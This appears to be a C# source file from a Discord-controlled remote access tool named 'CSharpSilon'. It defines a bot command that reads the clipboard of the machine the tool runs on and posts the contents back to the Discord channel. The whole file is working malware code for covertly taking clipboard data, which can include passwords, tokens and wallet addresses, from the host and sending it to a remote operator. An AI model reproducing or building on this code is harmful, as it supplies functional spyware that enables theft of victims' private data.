using System.Threading;
using System.Threading.Tasks;
using Discord.Commands;

namespace CSharpSilon.cmds
{
    public class Clipboard : ModuleBase<SocketCommandContext>
    {
        [Command("clipboard"), Alias("cb"), Summary("Returns the user's clipboard content")]
        public async Task ClipboardCommand()
        {
            string clipboardText = string.Empty;
            var thread = new Thread(() => clipboardText = System.Windows.Forms.Clipboard.GetText() ?? "Clipboard is empty or inaccessible.");
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            thread.Join();
            await ReplyAsync($"Current clipboard content: ```{clipboardText}```");
        }
    }
}